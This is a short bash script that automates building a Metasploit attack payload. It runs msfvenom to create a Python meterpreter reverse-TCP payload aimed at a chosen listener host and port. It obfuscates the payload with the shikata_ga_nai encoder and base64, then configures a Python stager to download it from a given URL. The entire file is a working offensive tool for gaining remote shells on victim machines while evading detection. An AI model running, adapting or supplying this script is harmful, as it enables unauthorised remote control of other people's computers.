#!/bin/bash

lhost=""
lport=""
url=""
#hardcoded values
tmp="/tmp/lol"
shellcode="www/shellcode"
stagerin="templates/stager.py"
stagerout="bin/stager.py"
msf="/opt/metasploit-framework/msfvenom"
encoder="x86/shikata_ga_nai"
payload="python/meterpreter/reverse_tcp"


usage() {
    echo "[>] Usage: $0 -l <lhost> -p <lport> -u <url>"
    exit 1
}

cl() {
    for i in {1..50} ; do
        echo -en "\b \b"
    done
}

while [ -n "$1" ]; do
    case "$1" in
        -l)
            shift; lhost="$1";;
        -p)
            shift; lport="$1";;
        -u)
            shift; url="$1";;
        *)
            echo "[!] Invalid switch"
            usage;;
    esac
    shift
done

[ -z "$lhost" -o -z "$lport" ] && usage

#clear workspace
for i in $tmp $shellcode $stagerout ; do
    rm $i &>/dev/null
done

echo -en "[>] Generating shellcode..."
$msf -p $payload lhost=$lhost lport=$lport -e $encoder -f python -b "\x00" -i 5 -o $shellcode &>/dev/null && cl
echo -en "[>] Encoding..."
cat $shellcode | base64 > $tmp && mv $tmp $shellcode && rm $tmp &>/dev/null && cl
echo -en "[>] Configuring stager..."
sed 's%'"__SERVER__"'%'"$url"'%' < $stagerin > $stagerout && cl
echo "[+] Done!!!"
